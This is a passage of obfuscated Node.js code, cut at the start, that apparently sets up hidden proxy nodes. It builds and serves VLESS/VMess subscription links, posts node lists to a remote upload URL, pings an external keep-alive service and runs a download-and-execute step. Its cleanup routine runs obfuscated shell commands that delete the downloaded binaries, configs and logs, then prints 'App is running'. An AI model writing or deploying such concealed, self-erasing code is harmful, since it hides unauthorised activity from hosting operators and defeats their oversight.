_0x114f2e={_0x2e0d29:0x1b6,_0x4bc5ec:0x1ba,_0x38a65a:0x175,_0x1dfdd2:0x1da,_0x3f229b:0x1c8,_0x2de165:0x140,_0x1e6b19:0x13a,_0xb6da6d:0x18f,_0x99cb5d:0x193,_0x12d3f4:0x14f,_0x192f95:0x1a7},_0x342bf5={_0x2ad878:0x163,_0x7a3c59:0x193,_0x58f90e:0x13e,_0xb11e86:0x1ea,_0x47c9cc:0x1d1};setTimeout(()=>{const _0x1b449f=_0x2075,_0x138aa3={'v':'2','ps':''+_0x421fb3,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1b449f(_0x114f2e._0x2e0d29),'net':'ws','type':'none','host':_0x1c0acd,'path':_0x1b449f(0x1ae),'tls':'tls','sni':_0x1c0acd,'alpn':'','fp':_0x1b449f(_0x114f2e._0x4bc5ec)},_0x24be88='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1b449f(_0x114f2e._0x38a65a)+_0x1c0acd+_0x1b449f(0x140)+_0x1c0acd+_0x1b449f(0x176)+_0x421fb3+_0x1b449f(_0x114f2e._0x1dfdd2)+Buffer[_0x1b449f(0x163)](JSON[_0x1b449f(0x1c2)](_0x138aa3))[_0x1b449f(0x167)]('base64')+_0x1b449f(0x151)+UUID+'@'+CFIP+':'+CFPORT+_0x1b449f(_0x114f2e._0x3f229b)+_0x1c0acd+_0x1b449f(_0x114f2e._0x2de165)+_0x1c0acd+_0x1b449f(_0x114f2e._0x1e6b19)+_0x421fb3+_0x1b449f(_0x114f2e._0xb6da6d);console['log'](Buffer['from'](_0x24be88)[_0x1b449f(0x167)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x1b449f(0x163)](_0x24be88)['toString'](_0x1b449f(_0x114f2e._0x99cb5d))),console[_0x1b449f(_0x114f2e._0x12d3f4)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x1b449f(_0x114f2e._0x192f95)]('/'+SUB_PATH,(_0x58ce1b,_0x3e05c1)=>{const _0x156f7a=_0x1b449f,_0x288243=Buffer[_0x156f7a(_0x342bf5._0x2ad878)](_0x24be88)['toString'](_0x156f7a(_0x342bf5._0x7a3c59));_0x3e05c1[_0x156f7a(_0x342bf5._0x58f90e)](_0x156f7a(_0x342bf5._0xb11e86),_0x156f7a(0x1c3)),_0x3e05c1[_0x156f7a(_0x342bf5._0x47c9cc)](_0x288243);}),_0x1d447e(_0x24be88);},0x7d0);});}}async function uploadNodes(){const _0x15f3cd={_0x42470d:0x16f,_0x594718:0x1cb,_0x4f712a:0x13f,_0x2c2c7f:0x150,_0x2b7812:0x16d,_0xad243d:0x1b2,_0x25077e:0x17f,_0xf10dd2:0x1cb,_0x2ff8ee:0x14f},_0x1a6155=_0x439737;if(UPLOAD_URL&&PROJECT_URL){const _0x277c04=PROJECT_URL+'/'+SUB_PATH,_0x452971={'subscription':[_0x277c04]};try{const _0x23bc20=await axios['post'](UPLOAD_URL+_0x1a6155(_0x15f3cd._0x42470d),_0x452971,{'headers':{'Content-Type':'application/json'}});return _0x23bc20&&_0x23bc20[_0x1a6155(_0x15f3cd._0x594718)]===0xc8?(console['log'](_0x1a6155(_0x15f3cd._0x4f712a)),_0x23bc20):null;}catch(_0x2ef64d){if(_0x2ef64d[_0x1a6155(0x159)]){if(_0x2ef64d[_0x1a6155(0x159)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x118e6e=fs[_0x1a6155(_0x15f3cd._0x2c2c7f)](listPath,'utf-8'),_0x910f37=_0x118e6e['split']('\x0a')[_0x1a6155(_0x15f3cd._0x2b7812)](_0x2c3def=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2c3def));if(_0x910f37[_0x1a6155(_0x15f3cd._0xad243d)]===0x0)return;const _0x11cd6b=JSON[_0x1a6155(0x1c2)]({'nodes':_0x910f37});try{const _0x3e118c=await axios[_0x1a6155(0x1ed)](UPLOAD_URL+_0x1a6155(0x18b),_0x11cd6b,{'headers':{'Content-Type':_0x1a6155(_0x15f3cd._0x25077e)}});return _0x3e118c&&_0x3e118c[_0x1a6155(_0x15f3cd._0xf10dd2)]===0xc8?(console[_0x1a6155(_0x15f3cd._0x2ff8ee)](_0x1a6155(0x1ef)),_0x3e118c):null;}catch(_0x21d16c){return null;}}else return;}}function cleanFiles(){const _0x2f4f23={_0x54d6b4:0x178,_0x4ef4c4:0x148,_0x323165:0x1ec,_0x21ba6c:0x1e0,_0x5f57e6:0x14a};setTimeout(()=>{const _0x457fc5={_0x2e18b0:0x1c1,_0x207e9c:0x14f},_0x2f7b54=_0x2075,_0x5896f9=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5896f9['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5896f9[_0x2f7b54(_0x2f4f23._0x54d6b4)](phpPath);process['platform']===_0x2f7b54(_0x2f4f23._0x4ef4c4)?exec(_0x2f7b54(_0x2f4f23._0x323165)+_0x5896f9[_0x2f7b54(0x1e0)]('\x20')+_0x2f7b54(0x1a8),_0x36a7a9=>{const _0x1093fd=_0x2f7b54;console[_0x1093fd(0x194)](),console['log']('App\x20is\x20running'),console[_0x1093fd(0x14f)](_0x1093fd(0x1e9));}):exec(_0x2f7b54(0x187)+_0x5896f9[_0x2f7b54(_0x2f4f23._0x21ba6c)]('\x20')+_0x2f7b54(_0x2f4f23._0x5f57e6),_0x3c05d5=>{const _0x23c8d2=_0x2f7b54;console[_0x23c8d2(0x194)](),console['log'](_0x23c8d2(_0x457fc5._0x2e18b0)),console[_0x23c8d2(_0x457fc5._0x207e9c)](_0x23c8d2(0x1e9));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x250474={_0x2d63b8:0x162,_0x2adf08:0x17f,_0x23d9c5:0x14f,_0x1b5365:0x174},_0x7568aa=_0x439737;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x7568aa(_0x250474._0x2d63b8));return;}try{const _0x17608e=await axios[_0x7568aa(0x1ed)](_0x7568aa(0x1af),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x7568aa(_0x250474._0x2adf08)}});return console[_0x7568aa(_0x250474._0x23d9c5)](_0x7568aa(_0x250474._0x1b5365)),_0x17608e;}catch(_0x400307){return console[_0x7568aa(0x197)](_0x7568aa(0x16e)+_0x400307['message']),null;}}async function startserver(){const _0x4018f2=_0x439737;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x448f0f){console[_0x4018f2(0x197)]('Error\x20in\x20startserver:',_0x448f0f);}}startserver()['catch'](_0x551c8b=>{const _0x570fc3={_0x66d629:0x197,_0x3f3681:0x1bb},_0x40aa65=_0x439737;console[_0x40aa65(_0x570fc3._0x66d629)](_0x40aa65(_0x570fc3._0x3f3681),_0x551c8b);}),app[_0x439737(0x165)](PORT,()=>console['log'](_0x439737(0x1cd)+PORT+'!'));
